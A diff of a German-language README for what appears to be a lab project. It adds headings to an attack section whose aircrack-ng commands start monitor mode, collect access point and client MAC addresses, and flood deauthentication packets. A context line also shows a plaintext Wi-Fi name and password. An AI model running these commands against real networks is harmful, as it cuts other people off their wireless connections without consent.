@@ -16,9 +16,14 @@
 - WLAN: DancingRainbows:supersecurepassword
 
 # Attack
+## Monitor Mode starten
 `airmon-ng start wlan0`
+
+## MAC-Adressen von AP und Target herausfinden
 `airodump-ng wlan0`
-`aireplay-ng -0 0 -a B8:27:EB:AC:05:0F -c 30:4B:07:ED:E3:8F wlan0`
+
+## Senden von Deauth-Packets
+`aireplay-ng -0 0 -a <AP-MAC> -c <Target(Client)-MAC> wlan0`
 
 # Python
 ## Install requirements
